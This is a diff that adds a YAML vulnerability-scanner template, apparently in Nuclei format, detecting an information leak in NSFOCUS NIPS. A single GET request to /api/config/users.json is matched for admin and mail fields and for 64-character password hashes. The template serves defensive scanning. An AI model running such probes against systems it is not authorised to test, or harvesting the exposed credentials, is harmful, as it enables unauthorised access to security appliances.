@@ -1,0 +1,31 @@
+id: poc-nsfocus-nips-users-json-info-leak
+info:
+  name: NSFOCUS NIPS users.json Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    Detects an information disclosure vulnerability in NSFOCUS NIPS where sensitive details like admin credentials and email addresses are exposed in users.json.
+http:
+  - method: GET
+    path:
+      - "/api/config/users.json"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"admin":'
+          - '"mail":'
+        part: body
+      - type: regex
+        regex:
+          - '"password":"([0-9a-z]{64})"'
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
